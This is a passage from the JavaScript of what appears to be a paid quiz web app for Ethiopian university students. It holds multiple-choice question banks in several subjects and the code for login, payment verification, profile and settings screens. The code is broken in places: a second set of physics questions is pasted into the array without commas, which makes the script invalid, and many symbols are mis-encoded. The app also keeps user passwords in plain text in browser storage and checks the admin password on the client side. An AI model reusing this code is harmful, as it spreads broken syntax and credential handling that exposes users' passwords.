                                        options: ["If P then Q; If Q then R; Therefore if P then R", "All A are B; All B are C; Therefore all A are C", "Some A are B; Some B are C; Therefore some A are C", "P or Q; Not P; Therefore Q"],
                                        correct: 0,
                                        explanation: "A hypothetical syllogism chains conditional statements together."
                                    },
                                    {
                                        question: "7. What is a disjunctive syllogism?",
                                        options: ["P or Q; Not P; Therefore Q", "If P then Q; P; Therefore Q", "All A are B; This is A; Therefore this is B", "Some A are B; This is A; Therefore this is B"],
                                        correct: 0,
                                        explanation: "Disjunctive syllogism eliminates one alternative in an 'or' statement."
                                    },
                                    {
                                        question: "8. What does 'reductio ad absurdum' mean?",
                                        options: ["Reducing to absurdity", "Appealing to emotion", "Using circular reasoning", "Making a hasty generalization"],
                                        correct: 0,
                                        explanation: "Reductio ad absurdum shows an argument leads to an absurd conclusion."
                                    },
                                    {
                                        question: "9. Which of these is necessary for a sound argument?",
                                        options: ["True premises and valid form", "Persuasive language", "Emotional appeal", "Popular acceptance"],
                                        correct: 0,
                                        explanation: "A sound argument has both valid form and true premises."
                                    },
                                    {
                                        question: "10. What is the relationship between deduction and certainty?",
                                        options: ["Deduction aims for certainty", "Deduction provides probability", "Deduction is always uncertain", "Deduction and certainty are unrelated"],
                                        correct: 0,
                                        explanation: "Deductive reasoning aims to provide certain conclusions from true premises."
                                    }
                                ]
                            },
                            {
                                name: "Chapter Six: Inductive Reasoning",
                                questions: [
                                    {
                                        question: "1. What is inductive reasoning?",
                                        options: ["Reasoning from specific to general", "Reasoning from general to specific", "Reasoning with certainty", "Reasoning based on emotions"],
                                        correct: 0,
                                        explanation: "Inductive reasoning moves from specific observations to general conclusions."
                                    },
                                    {
                                        question: "2. How does inductive reasoning differ from deductive reasoning?",
                                        options: ["Inductive is probabilistic, deductive is certain", "Inductive is certain, deductive is probabilistic", "They are the same", "Inductive uses emotions, deductive uses logic"],
                                        correct: 0,
                                        explanation: "Inductive reasoning deals with probability, while deductive aims for certainty."
                                    },
                                    {
                                        question: "3. What is an inductive generalization?",
                                        options: ["Drawing a general conclusion from specific examples", "Drawing a specific conclusion from general principles", "Using emotional appeals", "Attacking the person"],
                                        correct: 0,
                                        explanation: "Inductive generalization infers a general pattern from specific instances."
                                    },
                                    {
                                        question: "4. What makes an inductive argument strong?",
                                        options: ["The premises make the conclusion probable", "The premises guarantee the conclusion", "The argument is persuasive", "The conclusion is true"],
                                        correct: 0,
                                        explanation: "A strong inductive argument has premises that make the conclusion probable."
                                    },
                                    {
                                        question: "5. What is analogical reasoning?",
                                        options: ["Reasoning based on similarities", "Reasoning based on differences", "Reasoning with certainty", "Reasoning from general to specific"],
                                        correct: 0,
                                        explanation: "Analogical reasoning infers that things similar in known respects are similar in other respects."
                                    },
                                    {
                                        question: "6. What is causal reasoning?",
                                        options: ["Inferring cause-effect relationships", "Reasoning from general to specific", "Using emotional appeals", "Attacking the person"],
                                        correct: 0,
                                        explanation: "Causal reasoning identifies cause-and-effect relationships between events."
                                    },
                                    {
                                        question: "7. What is a hasty generalization?",
                                        options: ["Drawing a conclusion from insufficient evidence", "Using emotional language", "Appealing to authority", "Making a valid deduction"],
                                        correct: 0,
                                        explanation: "Hasty generalization draws a conclusion from too few or unrepresentative examples."
                                    },
                                    {
                                        question: "8. How can inductive arguments be strengthened?",
                                        options: ["By increasing sample size and diversity", "By using emotional language", "By attacking opponents", "By using complex terminology"],
                                        correct: 0,
                                        explanation: "Larger, more diverse samples make inductive generalizations stronger."
                                    },
                                    {
                                        question: "9. What is the relationship between induction and scientific method?",
                                        options: ["Science relies heavily on induction", "Science avoids induction", "Induction is irrelevant to science", "Science uses only deduction"],
                                        correct: 0,
                                        explanation: "Scientific method uses inductive reasoning to form hypotheses from observations."
                                    },
                                    {
                                        question: "10. Why can't inductive arguments provide absolute certainty?",
                                        options: ["Future observations might contradict the conclusion", "They are based on emotions", "They use invalid forms", "They are always fallacious"],
                                        correct: 0,
                                        explanation: "Inductive conclusions are always provisional and subject to revision with new evidence."
                                    }
                                ]
                            }
                        ]
                    },
                    psychology: [
                        {
                            question: "1. Who is considered the father of modern psychology?",
                            options: ["Sigmund Freud", "Wilhelm Wundt", "B.F. Skinner", "William James"],
                            correct: 1,
                            explanation: "Wilhelm Wundt established the first psychology laboratory in 1879, marking the beginning of modern psychology."
                        },
                        {
                            question: "2. What is the main focus of behaviorism?",
                            options: ["Unconscious mind", "Observable behavior", "Cognitive processes", "Human potential"],
                            correct: 1,
                            explanation: "Behaviorism focuses on observable behaviors rather than internal mental processes."
                        },
                        {
                            question: "3. Which part of the brain is responsible for memory?",
                            options: ["Hippocampus", "Amygdala", "Cerebellum", "Frontal lobe"],
                            correct: 0,
                            explanation: "The hippocampus plays a key role in forming and storing memories."
                        },
                        {
                            question: "4. What is classical conditioning?",
                            options: ["Learning through reinforcement", "Learning through association", "Learning through observation", "Learning through insight"],
                            correct: 1,
                            explanation: "Classical conditioning involves learning through association between stimuli."
                        },
                        {
                            question: "5. Who developed the theory of cognitive development?",
                            options: ["Erik Erikson", "Jean Piaget", "Lawrence Kohlberg", "Abraham Maslow"],
                            correct: 1,
                            explanation: "Jean Piaget developed the theory of cognitive development in children."
                        },
                        {
                            question: "6. What is the fight-or-flight response?",
                            options: ["A cognitive process", "A physiological reaction to stress", "A type of learning", "A personality trait"],
                            correct: 1,
                            explanation: "The fight-or-flight response is an automatic physiological reaction to perceived threat."
                        },
                        {
                            question: "7. Which perspective emphasizes free will and human potential?",
                            options: ["Psychoanalytic", "Humanistic", "Behavioral", "Cognitive"],
                            correct: 1,
                            explanation: "Humanistic psychology emphasizes free will, self-actualization, and human potential."
                        },
                        {
                            question: "8. What is the function of neurotransmitters?",
                            options: ["To protect the brain", "To transmit nerve impulses", "To store memories", "To regulate emotions"],
                            correct: 1,
                            explanation: "Neurotransmitters are chemical messengers that transmit signals between nerve cells."
                        },
                        {
                            question: "9. What does IQ stand for?",
                            options: ["Intelligence Quotient", "Intellectual Quality", "Intelligent Questioning", "Internal Query"],
                            correct: 0,
                            explanation: "IQ stands for Intelligence Quotient, a measure of cognitive ability."
                        },
                        {
                            question: "10. Which psychologist is associated with the hierarchy of needs?",
                            options: ["Carl Rogers", "Abraham Maslow", "B.F. Skinner", "Ivan Pavlov"],
                            correct: 1,
                            explanation: "Abraham Maslow developed the hierarchy of needs theory."
                        }
                    ],
                    english: [
                        {
                            question: "1. What is a synonym for 'happy'?",
                            options: ["Sad", "Joyful", "Angry", "Tired"],
                            correct: 1,
                            explanation: "'Joyful' is a synonym for 'happy', meaning feeling or showing pleasure."
                        },
                        {
                            question: "2. Which of these is a preposition?",
                            options: ["Run", "Beautiful", "Under", "Quickly"],
                            correct: 2,
                            explanation: "'Under' is a preposition that shows the relationship between nouns."
                        },
                        {
                            question: "3. What is the past tense of 'go'?",
                            options: ["Goed", "Went", "Gone", "Going"],
                            correct: 1,
                            explanation: "The past tense of 'go' is 'went', which is an irregular verb form."
                        },
                        {
                            question: "4. Which sentence is in passive voice?",
                            options: ["The cat chased the mouse.", "The mouse was chased by the cat.", "The cat is chasing the mouse.", "The cat will chase the mouse."],
                            correct: 1,
                            explanation: "Passive voice has the subject receiving the action: 'The mouse was chased'."
                        },
                        {
                            question: "5. What is the plural of 'child'?",
                            options: ["Childs", "Children", "Childes", "Childern"],
                            correct: 1,
                            explanation: "The plural of 'child' is 'children', which is an irregular plural form."
                        },
                        {
                            question: "6. Which word is an adjective?",
                            options: ["Run", "Beautiful", "Quickly", "Under"],
                            correct: 1,
                            explanation: "'Beautiful' is an adjective that describes a noun."
                        },
                        {
                            question: "7. What is the correct punctuation for this sentence: 'I love reading books'",
                            options: ["I love reading books?", "I love reading books!", "I love reading books.", "I love reading books,"],
                            correct: 2,
                            explanation: "A declarative sentence ends with a period."
                        },
                        {
                            question: "8. Which of these is a conjunction?",
                            options: ["And", "Run", "Beautiful", "Quickly"],
                            correct: 0,
                            explanation: "'And' is a conjunction that connects words, phrases, or clauses."
                        },
                        {
                            question: "9. What is the opposite of 'begin'?",
                            options: ["Start", "Continue", "End", "Pause"],
                            correct: 2,
                            explanation: "'End' is the antonym of 'begin'."
                        },
                        {
                            question: "10. Which sentence is correct?",
                            options: ["He don't like apples.", "He doesn't like apples.", "He doesn't likes apples.", "He don't likes apples."],
                            correct: 1,
                            explanation: "With third person singular 'he', we use 'doesn't' followed by the base verb 'like'."
                        }
                    ],
                    mathematics: [
                        {
                            question: "1. What is the value of œÄ (pi) approximately?",
                            options: ["3.14", "2.71", "1.62", "4.13"],
                            correct: 0,
                            explanation: "œÄ is approximately 3.14, the ratio of a circle's circumference to its diameter."
                        },
                        {
                            question: "2. What is the derivative of x¬≤?",
                            options: ["x", "2x", "x¬≥", "2"],
                            correct: 1,
                            explanation: "The derivative of x¬≤ is 2x, using the power rule of differentiation."
                        },
                        {
                            question: "3. How many degrees are in a right angle?",
                            options: ["45¬∞", "90¬∞", "180¬∞", "360¬∞"],
                            correct: 1,
                            explanation: "A right angle measures exactly 90 degrees."
                        },
                        {
                            question: "4. What is the square root of 144?",
                            options: ["11", "12", "13", "14"],
                            correct: 1,
                            explanation: "12 √ó 12 = 144, so the square root of 144 is 12."
                        },
                        {
                            question: "5. Which of these is a prime number?",
                            options: ["1", "9", "15", "17"],
                            correct: 3,
                            explanation: "17 is a prime number because it has exactly two distinct positive divisors: 1 and itself."
                        },
                        {
                            question: "6. What is the area of a circle with radius r?",
                            options: ["2œÄr", "œÄr¬≤", "œÄr", "2œÄr¬≤"],
                            correct: 1,
                            explanation: "The area of a circle is calculated using the formula œÄr¬≤."
                        },
                        {
                            question: "7. Solve for x: 2x + 5 = 15",
                            options: ["5", "10", "7.5", "2.5"],
                            correct: 0,
                            explanation: "2x + 5 = 15 ‚Üí 2x = 10 ‚Üí x = 5"
                        },
                        {
                            question: "8. What is the value of 5! (5 factorial)?",
                            options: ["25", "60", "120", "720"],
                            correct: 2,
                            explanation: "5! = 5 √ó 4 √ó 3 √ó 2 √ó 1 = 120"
                        },
                        {
                            question: "9. In a right triangle, what is the relationship between the sides?",
                            options: ["a¬≤ + b¬≤ = c¬≤", "a + b = c", "a¬≤ - b¬≤ = c¬≤", "a √ó b = c"],
                            correct: 0,
                            explanation: "The Pythagorean theorem states that in a right triangle, a¬≤ + b¬≤ = c¬≤, where c is the hypotenuse."
                        },
                        {
                            question: "10. What is the next number in the sequence: 1, 1, 2, 3, 5, 8, ...?",
                            options: ["10", "11", "12", "13"],
                            correct: 3,
                            explanation: "This is the Fibonacci sequence where each number is the sum of the two preceding ones: 5 + 8 = 13."
                        }
                    ],
                    geography: [
                        {
                            question: "1. What is the capital of Ethiopia?",
                            options: ["Addis Ababa", "Nairobi", "Kampala", "Djibouti"],
                            correct: 0,
                            explanation: "Addis Ababa is the capital and largest city of Ethiopia."
                        },
                        {
                            question: "2. Which is the longest river in the world?",
                            options: ["Amazon", "Nile", "Yangtze", "Mississippi"],
                            correct: 1,
                            explanation: "The Nile River is traditionally considered the longest river in the world at about 6,650 km."
                        },
                        {
                            question: "3. What is the study of maps called?",
                            options: ["Geology", "Cartography", "Topography", "Demography"],
                            correct: 1,
                            explanation: "Cartography is the study and practice of making maps."
                        },
                        {
                            question: "4. Which of these is a renewable resource?",
                            options: ["Coal", "Oil", "Solar energy", "Natural gas"],
                            correct: 2,
                            explanation: "Solar energy is a renewable resource that can be replenished naturally."
                        },
                        {
                            question: "5. What causes seasons on Earth?",
                            options: ["Distance from the sun", "Tilt of Earth's axis", "Rotation of Earth", "Revolution of the moon"],
                            correct: 1,
                            explanation: "Seasons are caused by the 23.5-degree tilt of Earth's axis as it orbits the sun."
                        },
                        {
                            question: "6. Which continent is the largest by area?",
                            options: ["Africa", "Asia", "North America", "Europe"],
                            correct: 1,
                            explanation: "Asia is the largest continent, covering about 30% of Earth's land area."
                        },
                        {
                            question: "7. What is the process of breaking down rocks called?",
                            options: ["Erosion", "Weathering", "Deposition", "Sedimentation"],
                            correct: 1,
                            explanation: "Weathering is the process of breaking down rocks, soils and minerals through contact with the Earth's atmosphere."
                        },
                        {
                            question: "8. Which of these is a type of climate?",
                            options: ["Tropical", "Desert", "Temperate", "All of the above"],
                            correct: 3,
                            explanation: "Tropical, desert, and temperate are all climate types found on Earth."
                        },
                        {
                            question: "9. What is the highest mountain in Africa?",
                            options: ["Mount Kenya", "Mount Kilimanjaro", "Mount Everest", "Mount Elbrus"],
                            correct: 1,
                            explanation: "Mount Kilimanjaro in Tanzania is the highest mountain in Africa at 5,895 meters."
                        },
                        {
                            question: "10. Which ocean is the largest?",
                            options: ["Atlantic", "Indian", "Arctic", "Pacific"],
                            correct: 3,
                            explanation: "The Pacific Ocean is the largest and deepest ocean, covering about 46% of Earth's water surface."
                        }
                    ],
                    physics: [
                        {
                            question: "1. What is the SI unit of force?",
                            options: ["Joule", "Watt", "Newton", "Pascal"],
                            correct: 2,
                            explanation: "The newton (N) is the SI unit of force, named after Isaac Newton."
                        },
                        {
                            question: "2. Which law states that for every action, there is an equal and opposite reaction?",
                            options: ["Newton's First Law", "Newton's Second Law", "Newton's Third Law", "Law of Gravitation"],
                            correct: 2,
                            explanation: "Newton's Third Law states that for every action, there is an equal and opposite reaction."
                        },
                        {
                            question: "3. What is the speed of light in a vacuum?",
                            options: ["300,000 km/s", "150,000 km/s", "500,000 km/s", "1,000,000 km/s"],
                            correct: 0,
                            explanation: "The speed of light in a vacuum is approximately 300,000 kilometers per second."
                        },
                        {
                            question: "4. Which of these is a vector quantity?",
                            options: ["Mass", "Time", "Velocity", "Temperature"],
                            correct: 2,
                            explanation: "Velocity is a vector quantity because it has both magnitude and direction."
                        },
                        {
                            question: "5. What is the unit of electric current?",
                            options: ["Volt", "Ampere", "Ohm", "Watt"],
                            correct: 1,
                            explanation: "The ampere (A) is the SI unit of electric current."
                        },
                        {
                            question: "6. Which type of lens converges light rays?",
                            options: ["Concave", "Convex", "Plano-concave", "Diverging"],
                            correct: 1,
                            explanation: "A convex lens converges light rays to a focal point."
                        },
                        {
                            question: "7. What is the energy stored in an object due to its position called?",
                            options: ["Kinetic energy", "Thermal energy", "Potential energy", "Chemical energy"],
                            correct: 2,
                            explanation: "Potential energy is stored energy due to an object's position or configuration."
                        },
                        {
                            question: "8. Which planet has the strongest gravitational pull?",
                            options: ["Earth", "Jupiter", "Saturn", "Mars"],
                            correct: 1,
                            explanation: "Jupiter has the strongest gravitational pull due to its large mass."
                        },
                        {
                            question: "9. What is the resistance of an ideal conductor?",
                            options: ["Zero", "Infinite", "1 ohm", "100 ohms"],
                            correct: 0,
                            explanation: "An ideal conductor has zero resistance to the flow of electric current."
                        },
                        {
                            question: "10. Which phenomenon explains why the sky appears blue?",
                            options: ["Refraction", "Reflection", "Rayleigh scattering", "Diffraction"],
                            correct: 2,
                            explanation: "Rayleigh scattering causes shorter blue wavelengths of light to scatter more in the atmosphere, making the sky appear blue."
                        }
                        {
  question: "1. What is the SI unit of electric current?",
  options: ["Volt", "Ampere", "Ohm", "Watt"],
  correct: 1,
  explanation: "The ampere (A) is the SI base unit for electric current, defined as the flow of one coulomb of charge per second."
}
                        {
  question: "2. Which law states that the pressure of a gas is inversely proportional to its volume at constant temperature?",
  options: ["Charles's Law", "Gay-Lussac's Law", "Boyle's Law", "Avogadro's Law"],
  correct: 2,
  explanation: "Boyle's Law states that P ‚àù 1/V when temperature is constant, meaning gas pressure increases as volume decreases."
}
                        {
  question: "3. What type of lens causes light rays to converge?",
  options: ["Concave", "Diverging", "Convex", "Plano-concave"],
  correct: 2,
  explanation: "Convex lenses are thicker in the middle and cause parallel light rays to converge at a focal point."
}
                        {
  question: "4. Which physicist formulated the laws of motion and universal gravitation?",
  options: ["Albert Einstein", "Niels Bohr", "Isaac Newton", "Galileo Galilei"],
  correct: 2,
  explanation: "Isaac Newton published his three laws of motion and law of universal gravitation in Philosophi√¶ Naturalis Principia Mathematica (1687)."
}
                        {
  question: "5. What phenomenon occurs when two waves superpose to form a resultant wave of greater amplitude?",
  options: ["Destructive interference", "Diffraction", "Constructive interference", "Dispersion"],
  correct: 2,
  explanation: "Constructive interference happens when waves meet in phase, combining to produce a wave with larger amplitude."
}
                        {
  question: "6. Which material allows electric current to flow with zero resistance at low temperatures?",
  options: ["Semiconductor", "Insulator", "Superconductor", "Conductor"],
  correct: 2,
  explanation: "Superconductors exhibit zero electrical resistance below a critical temperature, enabling perpetual current flow."
}
                        {
  question: "7. What is the energy of a photon given by?",
  options: ["E = mc¬≤", "E = hf", "E = Fd", "E = ¬Ωmv¬≤"],
  correct: 1,
  explanation: "The energy of a photon is E = hf, where h is Planck's constant and f is the frequency of the electromagnetic wave."
}
                        {
  question: "8. Which principle explains why a ship floats in water?",
  options: ["Pascal's Principle", "Bernoulli's Principle", "Archimedes' Principle", "Hooke's Law"],
  correct: 2,
  explanation: "Archimedes' Principle states that the buoyant force on an object equals the weight of the fluid it displaces."
}
                        {
  question: "9. What is the acceleration due to gravity on Earth's surface approximately?",
  options: ["9.8 m/s¬≤", "6.9 m/s¬≤", "10.2 m/s¬≤", "8.5 m/s¬≤"],
  correct: 0,
  explanation: "The standard acceleration due to gravity is about 9.8 m/s¬≤, though it varies slightly with latitude and altitude."
}
                        {
  question: "10. Which particle is responsible for mediating the electromagnetic force?",
  options: ["Graviton", "Higgs boson", "Photon", "Gluon"],
  correct: 2,
  explanation: "Photons are gauge bosons that carry the electromagnetic force, interacting with charged particles."
}
                    ]
                }
            }
        };
        
        document.addEventListener('DOMContentLoaded', function() {
            // DOM Elements
            const welcomePanel = document.getElementById('welcomePanel');
            const formPanel = document.getElementById('formPanel');
            const paymentContainer = document.getElementById('paymentContainer');
            const verificationContainer = document.getElementById('verificationContainer');
            const dashboardContainer = document.getElementById('dashboardContainer');
            const quizContainer = document.getElementById('quizContainer');
            const resultsContainer = document.getElementById('resultsContainer');
            const chapterSelectionContainer = document.getElementById('chapterSelectionContainer');
            const profileContainer = document.getElementById('profileContainer');
            const settingsContainer = document.getElementById('settingsContainer');
            const leaderboardContainer = document.getElementById('leaderboardContainer');
            const navbar = document.getElementById('navbar');
            const userInfo = document.getElementById('userInfo');
            const userName = document.getElementById('userName');
            const logoutButton = document.getElementById('logoutButton');
            const homeLink = document.getElementById('homeLink');
            const profileLink = document.getElementById('profileLink');
            const settingsLink = document.getElementById('settingsLink');
            const leaderboardLink = document.getElementById('leaderboardLink');
            const notification = document.getElementById('notification');
            const reportIssueDropdown = document.getElementById('reportIssueDropdown');
            
            // Admin modal elements
            const adminModal = document.getElementById('adminModal');
            const adminPassword = document.getElementById('adminPassword');
            const adminPasswordError = document.getElementById('adminPasswordError');
            const submitAdminPassword = document.getElementById('submitAdminPassword');
            const cancelAdminPassword = document.getElementById('cancelAdminPassword');
            
            const registerForm = document.getElementById('register-form');
            const loginForm = document.getElementById('login-form');
            const showLoginLink = document.getElementById('show-login');
            const showRegisterLink = document.getElementById('show-register');
            const showLoginBtn = document.getElementById('showLogin');
            const showRegisterBtn = document.getElementById('showRegister');
            
            // Profile elements
            const profilePicture = document.getElementById('profilePicture');
            const profilePicturePlaceholder = document.getElementById('profilePicturePlaceholder');
            const profilePictureInput = document.getElementById('profilePictureInput');
            const uploadProfilePictureBtn = document.getElementById('uploadProfilePictureBtn');
            const profileUserName = document.getElementById('profileUserName');
            const profileUserEmail = document.getElementById('profileUserEmail');
            const profileUserTelegram = document.getElementById('profileUserTelegram');
            const profileUserStatus = document.getElementById('profileUserStatus');
            const accountCreated = document.getElementById('accountCreated');
            const lastLogin = document.getElementById('lastLogin');
            const passwordChanged = document.getElementById('passwordChanged');
            const paymentStatus = document.getElementById('paymentStatus');
            const verificationStatusProfile = document.getElementById('verificationStatusProfile');
            const backFromProfile = document.getElementById('backFromProfile');
            
            // Settings elements
            const changePasswordForm = document.getElementById('changePasswordForm');
            const showChangePasswordBtn = document.getElementById('showChangePasswordBtn');
            const currentPassword = document.getElementById('currentPassword');
            const newPassword = document.getElementById('newPassword');
            const confirmNewPassword = document.getElementById('confirmNewPassword');
            const currentPasswordError = document.getElementById('currentPasswordError');
            const newPasswordError = document.getElementById('newPasswordError');
            const confirmNewPasswordError = document.getElementById('confirmNewPasswordError');
            const passwordChangeSuccess = document.getElementById('passwordChangeSuccess');
            const deleteAccountBtn = document.getElementById('deleteAccountBtn');
            const backFromSettings = document.getElementById('backFromSettings');
            
            // Payment elements
            const uploadArea = document.getElementById('uploadArea');
            const paymentScreenshot = document.getElementById('paymentScreenshot');
            const previewContainer = document.getElementById('previewContainer');
            const previewImage = document.getElementById('previewImage');
            const removeImageButton = document.getElementById('removeImage');
            const submitPaymentButton = document.getElementById('submitPayment');
            const paymentLoading = document.getElementById('paymentLoading');
            
            // Verification elements
            const verificationStatus = document.getElementById('verificationStatus');
            const verificationCodeDisplay = document.getElementById('verificationCodeDisplay');
            const verificationCodeText = document.getElementById('verificationCodeText');
            const codeExpiry = document.getElementById('codeExpiry');
            const verificationCodeInput = document.getElementById('verificationCode');
            const submitVerificationCodeButton = document.getElementById('submitVerificationCode');
            
            // Dashboard elements
            const universityCards = document.querySelectorAll('.university-card');
            const universitySelectionView = document.getElementById('universitySelectionView');
            const subjectsView = document.getElementById('subjectsView');
            const backToUniversitiesButton = document.getElementById('backToUniversities');
            const currentUniversityTitle = document.getElementById('currentUniversityTitle');
            const currentUniversitySubtitle = document.getElementById('currentUniversitySubtitle');
            const naturalScienceSubjects = document.getElementById('naturalScienceSubjects');
            const subjectCards = document.querySelectorAll('.subject-card');
            const haramayaContent = document.getElementById('haramaya-content');
            const comingSoonAddis = document.getElementById('coming-soon-addis');
            const comingSoonMekelle = document.getElementById('coming-soon-mekelle');
            const comingSoonGondar = document.getElementById('coming-soon-gondar');
            const comingSoonBahirDar = document.getElementById('coming-soon-bahir-dar');
            const comingSoonJimma = document.getElementById('coming-soon-jimma');
            const comingSoonHawassa = document.getElementById('coming-soon-hawassa');
            const comingSoonAdama = document.getElementById('coming-soon-adama');
            const comingSoonJigjiga = document.getElementById('coming-soon-jigjiga');
            const comingSoonArbaMinch = document.getElementById('coming-soon-arba-minch');
            
            // Chapter selection elements
            const chapterGrid = document.getElementById('chapterGrid');
            const backToSubjectsFromChapters = document.getElementById('backToSubjectsFromChapters');
            
            // Quiz elements
            const questionsContainer = document.getElementById('questionsContainer');
            const prevButton = document.getElementById('prevButton');
            const nextButton = document.getElementById('nextButton');
            const submitButton = document.getElementById('submitQuiz');
            const progressText = document.getElementById('progressText');
            const progressFill = document.getElementById('progressFill');
            const timerDisplay = document.getElementById('timerDisplay');
            const retakeButton = document.getElementById('retakeQuiz');
            const reviewButton = document.getElementById('reviewQuiz');
            const backToDashboardButton = document.getElementById('backToDashboard');
            const quizSubjectTitle = document.getElementById('quizSubjectTitle');
            const quizUniversityTitle = document.getElementById('quizUniversityTitle');
            const resultDetails = document.getElementById('resultDetails');
            const quizReview = document.getElementById('quizReview');
            const reviewContainer = document.getElementById('reviewContainer');
            const backToResultsButton = document.getElementById('backToResults');
            
            // Leaderboard elements
            const backFromLeaderboard = document.getElementById('backFromLeaderboard');
            const leaderboardBody = document.getElementById('leaderboardBody');
            
            // Back buttons
            const backFromVerification = document.getElementById('backFromVerification');
            const backFromQuiz = document.getElementById('backFromQuiz');
            
            // Variables
            let currentQuestion = 1;
            let totalQuestions = 10;
            let currentQuizQuestions = [];
            const userAnswers = {};
            let currentUniversity = null;
            let currentSubject = null;
            let currentChapterIndex = 0;
            let timerInterval;
            let timeRemaining = 600; // 10 minutes in seconds
            let quizResults = [];
            
            // Initialize chapter selection
            initializeChapterSelection();
            
            // Check if user is already logged in
            checkLoginStatus();
            
            // Welcome page buttons
            showLoginBtn.addEventListener('click', function() {
                showLoginPage();
            });
            
            showRegisterBtn.addEventListener('click', function() {
                showRegisterPage();
            });
            
            // Toggle between forms
            showLoginLink.addEventListener('click', function() {
                showLoginPage();
            });
            
            showRegisterLink.addEventListener('click', function() {
                showRegisterPage();
            });
            
            // Home link
            homeLink.addEventListener('click', function(e) {
                e.preventDefault();
                const currentUser = sessionStorage.getItem('currentUser');
                if (currentUser) {
                    const user = JSON.parse(currentUser);
                    if (user.verified) {
                        showDashboard(user.name);
                    } else if (user.paymentSubmitted) {
                        showVerificationPage(user.name);
                    } else {
                        showPaymentPage(user.name);
                    }
                } else {
                    showWelcomePage();
                }
            });
            
            // Profile link
            profileLink.addEventListener('click', function(e) {
                e.preventDefault();
                showProfilePage();
            });
            
            // Settings link
            settingsLink.addEventListener('click', function(e) {
                e.preventDefault();
                showSettingsPage();
            });
            
            // Leaderboard link - now with admin password check
            leaderboardLink.addEventListener('click', function(e) {
                e.preventDefault();
                showAdminModal();
            });
            
            // Admin modal functionality
            submitAdminPassword.addEventListener('click', function() {
                if (adminPassword.value === ADMIN_PASSWORD) {
                    adminModal.style.display = 'none';
                    adminPassword.value = '';
                    adminPasswordError.style.display = 'none';
                    showLeaderboard();
                } else {
                    adminPasswordError.style.display = 'block';
                }
            });
            
            cancelAdminPassword.addEventListener('click', function() {
                adminModal.style.display = 'none';
                adminPassword.value = '';
                adminPasswordError.style.display = 'none';
            });
            
            function showAdminModal() {
                adminModal.style.display = 'flex';
            }
            
            // Show change password form button
            showChangePasswordBtn.addEventListener('click', function() {
                changePasswordForm.style.display = 'block';
                showChangePasswordBtn.style.display = 'none';
            });
            
            // Back button event listeners
            backFromVerification.addEventListener('click', function() {
                showPaymentPage(JSON.parse(sessionStorage.getItem('currentUser')).name);
            });
            
            backFromQuiz.addEventListener('click', function() {
                if (currentSubject === 'logic') {
                    showChapterSelection();
                } else {
                    showUniversitySubjects(currentUniversity);
                }
            });
            
            backToUniversitiesButton.addEventListener('click', function() {
                showUniversitySelection();
            });
            
            backToSubjectsFromChapters.addEventListener('click', function() {
                showUniversitySubjects(currentUniversity);
            });
            
            backFromProfile.addEventListener('click', function() {
                showDashboard(JSON.parse(sessionStorage.getItem('currentUser')).name);
            });
            
            backFromSettings.addEventListener('click', function() {
                showDashboard(JSON.parse(sessionStorage.getItem('currentUser')).name);
            });
            
            backFromLeaderboard.addEventListener('click', function() {
                showDashboard(JSON.parse(sessionStorage.getItem('currentUser')).name);
            });
            
            backToResultsButton.addEventListener('click', function() {
                quizReview.style.display = 'none';
                resultsContainer.style.display = 'block';
            });
            
            // Profile picture upload
            uploadProfilePictureBtn.addEventListener('click', function() {
                profilePictureInput.click();
            });
            
            profilePictureInput.addEventListener('change', function(e) {
                if (e.target.files && e.target.files[0]) {
                    const file = e.target.files[0];
                    
                    // Check file size (max 5MB)
                    if (file.size > 5 * 1024 * 1024) {
                        showNotification('File size must be less than 5MB', 'error');
                        return;
                    }
                    
                    // Check file type
                    if (!file.type.match('image.*')) {
                        showNotification('Please select an image file', 'error');
                        return;
                    }
                    
                    // Preview image
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        profilePicture.src = e.target.result;
                        profilePicture.style.display = 'block';
                        profilePicturePlaceholder.style.display = 'none';
                        
                        // Save to localStorage
                        const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                        currentUser.profilePicture = e.target.result;
                        sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
                        
                        // Update in localStorage
                        const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                        const userIndex = existingUsers.findIndex(u => u.id === currentUser.id);
                        if (userIndex !== -1) {
                            existingUsers[userIndex] = currentUser;
                            localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                        }
                        
                        showNotification('Profile picture updated successfully!', 'success');
                    };
                    reader.readAsDataURL(file);
                }
            });
            
            // Change password form
            changePasswordForm.addEventListener('submit', function(e) {
                e.preventDefault();
                let isValid = true;
                
                // Hide all error messages
                currentPasswordError.style.display = 'none';
                newPasswordError.style.display = 'none';
                confirmNewPasswordError.style.display = 'none';
                passwordChangeSuccess.style.display = 'none';
                
                // Get current user
                const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                
                // Current password validation
                if (currentPassword.value !== currentUser.password) {
                    currentPasswordError.textContent = 'Current password is incorrect';
                    currentPasswordError.style.display = 'block';
                    isValid = false;
                }
                
                // New password validation
                if (!validatePassword(newPassword.value)) {
                    newPasswordError.style.display = 'block';
                    isValid = false;
                }
                
                // Confirm new password validation
                if (newPassword.value !== confirmNewPassword.value) {
                    confirmNewPasswordError.style.display = 'block';
                    isValid = false;
                }
                
                if (isValid) {
                    // Update password
                    currentUser.password = newPassword.value;
                    currentUser.passwordChanged = new Date().toISOString();
                    
                    // Update in sessionStorage
                    sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
                    
                    // Update in localStorage
                    const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                    const userIndex = existingUsers.findIndex(u => u.id === currentUser.id);
                    if (userIndex !== -1) {
                        existingUsers[userIndex] = currentUser;
                        localStorage.setItem('quizUsers', JSON.stringify(existingUsers));
                    }
                    
                    // Show success message
                    passwordChangeSuccess.style.display = 'block';
                    
                    // Reset form
                    changePasswordForm.reset();
                    
                    // Show notification
                    showNotification('Password changed successfully!', 'success');
                    
                    // Hide form again
                    changePasswordForm.style.display = 'none';
                    showChangePasswordBtn.style.display = 'block';
                }
            });
            
            // Delete account button
            deleteAccountBtn.addEventListener('click', function() {
                if (confirm('Are you sure you want to delete your account? This action cannot be undone.')) {
                    const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
                    
                    // Remove from localStorage
                    const existingUsers = JSON.parse(localStorage.getItem('quizUsers')) || [];
                    const updatedUsers = existingUsers.filter(u => u.id !== currentUser.id);
                    localStorage.setItem('quizUsers', JSON.stringify(updatedUsers));
                    
                    // Remove from sessionStorage
                    sessionStorage.removeItem('currentUser');
                    
                    showNotification('Account deleted successfully', 'success');
                    
